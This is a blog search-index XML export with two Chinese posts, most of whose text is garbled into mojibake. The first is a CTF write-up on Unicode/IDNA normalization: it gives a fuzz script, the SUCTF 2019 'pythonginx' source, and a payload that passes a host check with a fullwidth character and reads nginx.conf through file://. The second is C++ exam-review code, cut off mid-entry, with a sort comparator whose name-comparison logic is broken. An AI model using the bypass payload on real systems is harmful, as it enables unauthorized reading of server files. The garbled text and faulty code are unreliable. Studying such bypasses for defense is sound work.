<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Exploitable Antipatterns in Unicode Normalization</title>
      <link href="/exploit-in-unicode-normalization.html"/>
      <url>/exploit-in-unicode-normalization.html</url>
      <content type="html"><![CDATA[<p>è¿™ä¸€ç¯‡æ–‡ç« æºè‡ªäºBlack hat 2019çš„ä¸€ä¸ªè®®é¢˜ï¼Œæœ‰ä¸€ä¸ªè¯¦ç»†çš„<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">ppt</a>çœ‹ç€å¥½åƒæŒºæœ‰è¶£ï¼Œæ‹¿è¿‡æ¥å­¦ä¹ ä¸€ä¸‹ï¼Œè€Œä¸”æœ€è¿‘ä¹Ÿæœ‰CTFé¢˜ç›®å‡ºç°äº†æœ‰å…³è¿™ä¸ªçš„çŸ¥è¯†ç‚¹ï¼Œç»“åˆä¸€ä¸‹è¿™ä¸ªé¢˜ç›®çœ‹çœ‹ï¼Œä¸»è¦æ˜¯å¤ä¹ æœºè¯•æ²¡å…´è¶£ï¼Œå¾—æ‰¾ç‚¹å…¶ä»–ä¸œè¥¿<a id="more"></a>çœ‹çœ‹ã€‚</p><h3 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h3><p>ä»è¿™ä¸ªè®®é¢˜æ¥çœ‹åº”è¯¥æ˜¯ä¸ªç¼–ç é—®é¢˜å¯¼è‡´çš„æ¼æ´</p><p>è®®é¢˜äººç»™å‡ºäº†ğ“€¬.netè¿™æ ·çš„ä¸€ä¸ªç½‘å€ï¼Œä½†æ˜¯ä¼šè·³è½¬åˆ°<code>http://xn--fq7d.net/</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªäººç«™åœ¨ä¸¤å¤´é•¿é¢ˆé¹¿ä¸Šï¼Œæ˜¯ä¸€ä¸ªåŸƒåŠçš„æ–‡å­—ä»£è¡¨å¿™ç¢Œã€‚ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ç§æƒ…å†µï¼Ÿéœ€è¦äº†è§£è¿™æ˜¯æ€ä¹ˆç¼–ç è§£ç çš„~</p><h3 id="ä¸€äº›åŸºç¡€"><a href="#ä¸€äº›åŸºç¡€" class="headerlink" title="ä¸€äº›åŸºç¡€"></a>ä¸€äº›åŸºç¡€</h3><h4 id="ä»€ä¹ˆæ˜¯IDNï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯IDNï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯IDNï¼Ÿ"></a>ä»€ä¹ˆæ˜¯IDNï¼Ÿ</h4><p>å›½é™…åŒ–åŸŸåIDNs (Internationalized Domain Names)ä¹Ÿç§°å¤šè¯­ç§åŸŸåï¼Œæ˜¯æŒ‡éè‹±è¯­å›½å®¶ä¸ºæ¨å¹¿æœ¬å›½è¯­è¨€çš„åŸŸåç³»ç»Ÿçš„ä¸€ä¸ªæ€»ç§°ï¼Œä¾‹å¦‚å«æœ‰æ—¥æ–‡çš„ä¸ºæ—¥æ–‡åŸŸåï¼Œå«æœ‰ä¸­æ–‡çš„åŸŸåä¸ºä¸­æ–‡åŸŸåã€‚ç®€å•æ»´è¯´å°±æ˜¯éè‹±è¯­è¡¨ç¤ºçš„åŸŸåã€‚</p><h4 id="Punycode"><a href="#Punycode" class="headerlink" title="Punycode"></a>Punycode</h4><p>æ˜¯ä¸€ç§è¡¨ç¤ºUnicodeç å’ŒASCIIç çš„æœ‰é™çš„å­—ç¬¦é›†ã€‚ä¾‹å¦‚ï¼šâ€œmÃ¼nchenâ€ï¼ˆå¾·å›½æ…•å°¼é»‘ï¼‰ä¼šè¢«ç¼–ç ä¸ºâ€œmnchen-3yaâ€ã€‚ç”¨äºDNSç³»ç»Ÿçš„ç¼–ç  ï¼Œé˜²æ­¢æ‰€è°“çš„IDNæ¬ºéª—ã€‚</p><p>åœ¨IDNsï¼ˆå›½é™…åŒ–åŸŸåInternationalized Domain Namesï¼‰æ¨å‡ºä»¥åï¼Œä¸ºäº†ä¿è¯å…¼å®¹ä»¥å‰çš„DNSï¼Œæ‰€ä»¥ï¼Œå¯¹è¿™äº›éè‹±è¯­çš„å­—ç¬¦è¿›è¡Œpunycodeè½¬ç ï¼Œè½¬ç åçš„punycodeå°±ç”±26ä¸ªå­—æ¯+10ä¸ªæ•°å­—ï¼Œè¿˜æœ‰â€œ-â€ç»„æˆã€‚</p><h4 id="IDNçš„æ‰§è¡Œè¿‡ç¨‹"><a href="#IDNçš„æ‰§è¡Œè¿‡ç¨‹" class="headerlink" title="IDNçš„æ‰§è¡Œè¿‡ç¨‹"></a>IDNçš„æ‰§è¡Œè¿‡ç¨‹</h4><p><img src="https://s2.ax1x.com/2019/09/17/nIVDsK.png" alt="nIVDsK.png" style="zoom:33%;"></p><p>ä¸€å…±æ˜¯ä¸¤ä¸ªæ­¥éª¤ï¼Œç¬¬ä¸€ä¸ªæ˜¯Normalizationï¼Œæ™®é€šåŒ–ï¼Œæ­¤æ—¶ï¼Œå°±æ˜¯æŠŠå„å›½çš„æ–‡å­—å˜æˆä¸€ä¸ªæ ‡å‡†çš„å½¢å¼ï¼Œç±»ä¼¼ä¸€ä¸ªè¿‡æ¸¡</p><p><img src="https://s2.ax1x.com/2019/09/17/nIerUe.png" alt="nIerUe.png" style="zoom: 33%;"></p><p>ç¬¬äºŒä¸ªå°±æ˜¯ä¸€ä¸ªpunycodeè½¬ç ï¼Œå°†unicodeè½¬åŒ–æˆacsii</p><p><img src="https://s2.ax1x.com/2019/09/17/nInFYQ.png" alt="nInFYQ.png" style="zoom: 33%;"></p><p>è¿™ä¸ªè®®é¢˜æŒ‡å‡ºå…³é”®ç‚¹åœ¨äºéƒ¨åˆ†å­—ç¬¦åœ¨ç»è¿‡Normalizationè¿™ä¸€éƒ¨åˆ†çš„æ—¶å€™ç›´æ¥å˜æˆasciiç ï¼Œç„¶åå¦‚æœåœ¨ç»å†ä¸€épunycodeè½¬ç ä¹Ÿæ˜¯æ²¡å•¥ä¸åŒï¼Œè¿˜æ˜¯asciiç ï¼Œå°±æ˜¯ä¸‹å›¾ï¼Œå¯ä»¥ä½¿ç”¨è¯¥ç½‘å€è¿›è¡Œæµ‹è¯•<code>https://www.punycoder.com/</code>ï¼š</p><p><img src="https://s2.ax1x.com/2019/09/17/nIKqFU.png" alt="nIKqFU.png" style="zoom: 33%;"></p><p><img src="https://s2.ax1x.com/2019/09/17/nIKjSJ.png" alt="nIKjSJ.png" style="zoom:33%;"></p><p>è¿™æ ·çš„é—®é¢˜å¯ä»¥åˆ©ç”¨åœ¨å¾ˆå¤šè·³è½¬æ¼æ´ä¸Šï¼Œè¯¥è®®é¢˜çš„ä½œè€…åœ¨pptä¸Šä¹ŸæŒ‡å‡ºä»–åœ¨ä¸€äº›æµè§ˆå™¨å’Œåœ¨å“ªäº›ç¼–ç¨‹è¯­è¨€ä¸­å‘ç°çš„ç›¸ä¼¼æ¼æ´ç‚¹</p><p><img src="https://s2.ax1x.com/2019/09/17/nIQuv9.png" alt="nIQuv9.png"></p><p>å½“ç„¶å¾ˆå¤šCVEä¹Ÿå·²ç»è¢«ä¿®å¤äº†ï¼Œå¯èƒ½æ˜¯å› ä¸ºæˆ‘æ²¡æ›´æ–°pythonï¼Œæˆ‘è‡ªå·±çš„pythonè¿˜æ˜¯å­˜åœ¨è¿™ä¸ªé—®é¢˜çš„(âŠ™oâŠ™)â€¦</p><p><img src="https://s2.ax1x.com/2019/09/17/nI1v4K.png" alt="nI1v4K.png" style="zoom: 67%;"></p><p>å½“ç„¶ä¹Ÿä¸æ­¢ä¸Šé¢é‚£ä¸€ä¸ªå­—ç¬¦å­˜åœ¨è¿™æ ·çš„é—®é¢˜ï¼Œå€Ÿç”¨altmanå¤§ä½¬çš„fuzzè„šæœ¬ï¼Œå¯ä»¥æŠŠå…¶ä»–ç±»ä¼¼å­—ç¬¦ä¹Ÿæå‡ºæ¥ï¼ŒåŸç†å¾ˆç®€å•å°±æ˜¯ï¼Œä»ASCIIä»¥å¤–çš„å­—ç¬¦å»åˆ¤æ–­ï¼Œä»¥æ˜¯å¦å­˜åœ¨<code>-</code>å…³é”®å­—ä½œä¸ºåˆ¤æ–­æ¡ä»¶å³å¯ï¼Œæˆ‘å°±ä¸é‡å¤é€ è½®å­äº†ã€‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>,<span class="number">65537</span>):</span><br><span class="line">tmp=chr(i)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">res = tmp.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"-"</span>) <span class="keyword">in</span> res:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">print(<span class="string">"U:&#123;&#125; A:&#123;&#125; ascii:&#123;&#125; "</span>.format(tmp,res,i))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢å°±ç»“åˆé¢˜ç›®å­¦ä¹ ä¸€ä¸‹äº†233333</p><p>é¢˜ç›®æ¥æºï¼š<a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/pythonginx" target="_blank" rel="noopener">SUSCTF2019-pythonginx</a></p><p>é¢˜ç›®ç»™å‡ºéƒ¨åˆ†æºä»£ç ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 333"</span></span><br><span class="line">    &lt;/code&gt;</span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure><p>åæ­£è¿™ä¸ªä»£ç çš„æ„æ€å°±æ˜¯åŸŸåé‡Œé¢ä¸å…è®¸å‡ºç°<code>suctf.cc</code>ï¼Œä½†æœ€åç»è¿‡Normalizationå¤„ç†ä¹‹åæ»¡è¶³<code>suctf.cc</code>å°±å¯ä»¥è¯»å–æ–‡ä»¶äº†ï¼Œæ­£å¥½æ˜¯ä¸Šé¢çš„çŸ¥è¯†ç‚¹ï¼Œæˆ‘ä»¬åªè¦æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä»£æ›¿å…¶ä¸­çš„ä¸€ä¸ªå­—ç¬¦å³å¯ï¼Œè¿™é‡Œä»fuzzçš„å­—ç¬¦ä¸­æ‰¾åˆ°<code>ï¼£</code>å»æ›¿ä»£ï¼Œæœ€åä½¿ç”¨fileåè®®å»è¯»å–æ–‡ä»¶ï¼Œå…ˆæ˜¯æŒ‰ç…§æç¤ºè¯»å–nginxçš„é…ç½®æ–‡ä»¶,<code>file://suctf.cï¼£/../../../../usr/local/nginx/conf/nginx.conf</code>ï¼Œç„¶åå†å»è¯»å–flagå°±å¥½</p><p><img src="https://s2.ax1x.com/2019/09/17/nIUWf1.png" alt="nIUWf1.png"></p>]]></content>
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>çæçš„æœºè¯•å¤ä¹ </title>
      <link href="/byoj-review.html"/>
      <url>/byoj-review.html</url>
      <content type="html"><![CDATA[<p>ä¿ç ”çš„äº‹æƒ…ä»¤äººå¤´ç–¼ï¼Œè¿˜ä¸çŸ¥é“èƒ½ä¸èƒ½å»è‡ªå·±å¿ƒä»ªçš„å­¦æ ¡ï¼Œæ¯å¤©è¦å¤ä¹ ä¸€ä¸‹æœºè¯•ï¼Œçœ‹ç€è¿‘æœŸçš„æ¯”èµ›å¥½åƒå‡ºäº†ä¸€äº›å¾ˆæœ‰æ„æ€çš„ç‚¹ä¹Ÿä¸èƒ½å»å­¦ï¼ŒçœŸçš„éš¾å—ï¼Œåªèƒ½ç¡¬ç€å¤´çš®å¤ä¹ å…¶ä»–çš„ä¸€äº›ä¸æ„Ÿå…´è¶£çš„çŸ¥è¯†ï¼Œæˆ‘å¤ªéš¾<a id="more"></a>äº†ã€‚ã€‚</p><h4 id="æ ¼å¼é—®é¢˜"><a href="#æ ¼å¼é—®é¢˜" class="headerlink" title="æ ¼å¼é—®é¢˜"></a>æ ¼å¼é—®é¢˜</h4><p>scanfå‡½æ•°è¾“å…¥çš„æ˜¯å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯â€%sâ€çš„æ—¶å€™ï¼Œå˜é‡å‰ä¸éœ€è¦åŠ <code>&amp;</code>ï¼›å¦å¤–åœ¨<code>%d</code>ä¹‹é—´æ’å…¥æ•°å­—æ¥è¯»å–ç‰¹å®šä½æ•°çš„æ•°å­—çš„æŠ€å·§æœ‰æ—¶å€™å¯ä»¥åˆ©ç”¨ï¼Œæ¯”å¦‚<code>%2d</code>ä»£è¡¨çš„æ˜¯ä»è¿™ä¸²æ•°å­—ä¸²ä¸­è·å–ä¸¤ä½æ•°å­—å‡ºæ¥ã€‚</p><p>printfå‡½æ•°ä½¿ç”¨çš„æ—¶å€™æ³¨æ„å˜é‡å‰ä¸éœ€è¦<code>&amp;</code>ï¼Œä¸ç„¶ä¼šè¾“å‡ºåœ°å€ï¼Œå¦‚æœåœ¨æŸäº›è¾“å‡ºå°æ•°éœ€è¦ä¿ç•™å¤šå°‘ä½ï¼Œåˆ™éœ€è¦æ³¨æ„æ ¼å¼çš„ä¸²æ˜¯è¿™æ ·çš„<code>%.3lf</code>ï¼Œæ˜¯åœ¨å°æ•°ç‚¹ååŠ ä¸Šæ•°å­—3</p><p>getså‡½æ•°ä»¥å›è½¦ç»“æŸã€‚ç©ºæ ¼æ˜¯å¯ä»¥è¯»è¿›å»çš„ï¼Œæœ€å¥½åŠ ä¸Šgetchar()æ¶ˆé™¤å›è½¦</p><h4 id="æ’åºç±»"><a href="#æ’åºç±»" class="headerlink" title="æ’åºç±»"></a>æ’åºç±»</h4><p>è¿™ç§é¢˜å‹ä¸€èˆ¬ä½¿ç”¨C++å†…ç½®çš„sortå‡½æ•°ï¼Œæ ¹æ®é¢˜ç›®ä½¿ç”¨è‡ªå·±æ„é€ çš„æ’åºå‡½æ•°ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯è‡ªå®šä¹‰cmpå‡½æ•°ï¼Œå¦ä¸€ç§æ˜¯ç›´æ¥åœ¨ç»“æ„ä½“é‡Œé¢è¿ç®—ç¬¦é‡è½½ã€‚å¥½åƒå¯¹äºå †è¿™ç§æ•°æ®ç»“æ„æœ‰ç‚¹ä¸åŒã€‚</p><p><img src="https://s2.ax1x.com/2019/09/17/nI0E9A.png" alt="nI0E9A.png" style="zoom:80%;"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">int</span> score;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> Stu &amp;A) <span class="keyword">const</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(score != A.score) <span class="keyword">return</span> score&lt;A.score;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name,A.name))  <span class="keyword">return</span> <span class="built_in">strcmp</span>(name,A.name)&lt;<span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> age&lt;A.age;</span><br><span class="line">&#125;</span><br><span class="line">&#125;buff[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;N)!=EOF)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; N; i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s %d %d"</span>,buff[i].name,&amp;buff[i].age,&amp;buff[i].score);</span><br><span class="line">&#125;</span><br><span class="line">sort(buff,buff+N);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; N;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s %d %d\n"</span>,buff[i].name,buff[i].age,buff[i].score);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ—¥æœŸç±»"><a href="#æ—¥æœŸç±»" class="headerlink" title="æ—¥æœŸç±»"></a>æ—¥æœŸç±»</h4><p><img src="https://s2.ax1x.com/2019/09/17/nI0UBT.png" alt="nI0UBT.png"></p><p>æœ€å¤§çš„ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯æ‰¾ä¸€ä¸ªç»Ÿä¸€èµ·ç‚¹ï¼Œä¸€èˆ¬éƒ½æ˜¯ä»¥0å¹´1æœˆ1æ—¥å¼€å§‹ï¼Œè®¾ç½®æ—¥å­çš„ç»“æ„ä½“ï¼Œç„¶åä»¥æš´åŠ›æ‰“è¡¨çš„æ–¹å¼è¾“å‡ºï¼Œæ³¨æ„çš„æ˜¯é—°å¹´çš„åˆ¤æ–­æ–¹å¼ï¼Œæ—¥æœŸå¤„ç†æ˜¯å¦éœ€è¦ï¼Œå­¦ä¹ å¦‚ä½•å·§å¦™åœ°ä½¿ç”¨æ•°ç»„å­˜å‚¨ï¼Œä¹Ÿè¦æ³¨æ„å­˜è¿™ç§æ–¹æ³•å­˜åœ¨ç¼ºé™·ï¼Œå¹´ä»½æ•°é¢æ˜¯æœ‰ä¸€å®šä¸Šé™çš„</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISYEARP(x)  x % 4 == 0&amp;&amp; x%100 != 0 || x % 400 ==0 ?1:0 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> day0fmonth[<span class="number">13</span>][<span class="number">2</span>]=&#123;</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">31</span>,<span class="number">31</span>,</span><br><span class="line"><span class="number">28</span>,<span class="number">29</span>,</span><br><span class="line"><span class="number">31</span>,<span class="number">31</span>,</span><br><span class="line"><span class="number">30</span>,<span class="number">30</span>,</span><br><span class="line"><span class="number">31</span>,<span class="number">31</span>,</span><br><span class="line"><span class="number">30</span>,<span class="number">30</span>,</span><br><span class="line"><span class="number">31</span>,<span class="number">31</span>,</span><br><span class="line"><span class="number">31</span>,<span class="number">31</span>,</span><br><span class="line"><span class="number">30</span>,<span class="number">30</span>,</span><br><span class="line"><span class="number">31</span>,<span class="number">31</span>,</span><br><span class="line"><span class="number">30</span>,<span class="number">30</span>,</span><br><span class="line"><span class="number">31</span>,<span class="number">31</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Date</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> year;</span><br><span class="line"><span class="keyword">int</span> month;</span><br><span class="line"><span class="keyword">int</span> day;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Nextday</span><span class="params">()</span></span>&#123;</span><br><span class="line">day++;</span><br><span class="line"><span class="keyword">if</span>(day &gt; day0fmonth[month][ISYEARP(year)])&#123;</span><br><span class="line">month++;</span><br><span class="line">day = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(month &gt; <span class="number">12</span>)&#123;</span><br><span class="line">month = <span class="number">1</span>;</span><br><span class="line">year++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> buff[<span class="number">5001</span>][<span class="number">13</span>][<span class="number">32</span>];  <span class="comment">//æœ€å¥½æ”¾å…¨å±€ï¼Œä¸ç„¶æœ‰å¯èƒ½çˆ†æ ˆ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> monthname[<span class="number">13</span>][<span class="number">20</span>] = &#123;</span><br><span class="line"><span class="string">""</span>,</span><br><span class="line"><span class="string">"January"</span>,</span><br><span class="line"><span class="string">"February"</span>,</span><br><span class="line"><span class="string">"March"</span>,</span><br><span class="line"><span class="string">"April"</span>,</span><br><span class="line"><span class="string">"May"</span>,</span><br><span class="line"><span class="string">"June"</span>,</span><br><span class="line"><span class="string">"July"</span>,</span><br><span class="line"><span class="string">"August"</span>,</span><br><span class="line"><span class="string">"September"</span>,</span><br><span class="line"><span class="string">"October"</span>,</span><br><span class="line"><span class="string">"November"</span>,</span><br><span class="line"><span class="string">"December"</span>,</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> weekname[<span class="number">7</span>][<span class="number">20</span>] = &#123;</span><br><span class="line"><span class="string">"Sunday"</span>,</span><br><span class="line"><span class="string">"Monday"</span>,</span><br><span class="line"><span class="string">"Tuesday"</span>,</span><br><span class="line"><span class="string">"Wednesday"</span>,</span><br><span class="line"><span class="string">"Thursday"</span>,</span><br><span class="line"><span class="string">"Friday"</span>,</span><br><span class="line"><span class="string">"Saturday"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Date tmp;</span><br><span class="line">tmp.year = <span class="number">0</span>;</span><br><span class="line">tmp.month = <span class="number">1</span>;</span><br><span class="line">tmp.day = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> cnt  = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(tmp.year != <span class="number">5000</span>)&#123;</span><br><span class="line">buff[tmp.year][tmp.month][tmp.day] = cnt++;  <span class="comment">//ä»ç¬¬é›¶å¤©å¼€å§‹ </span></span><br><span class="line">tmp.Nextday();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> d,y,m;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d %s %d"</span>,&amp;d,s,&amp;y)!=EOF)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span> ; i &lt;= <span class="number">12</span> ;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(s,monthname[i]) == <span class="number">0</span>)&#123;</span><br><span class="line">m = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> count = buff[y][m][d] - buff[<span class="number">2019</span>][<span class="number">9</span>][<span class="number">16</span>] + <span class="number">1</span>;  <span class="comment">//æ‰¾ä¸€ä¸ªå‘¨ä¸€å¥½ç®— </span></span><br><span class="line"><span class="built_in">puts</span>(weekname[(count % <span class="number">7</span> + <span class="number">7</span>) %<span class="number">7</span>]);   <span class="comment">//ä¿è¯æ˜¯éè´Ÿæ•° </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Hashçš„åº”ç”¨"><a href="#Hashçš„åº”ç”¨" class="headerlink" 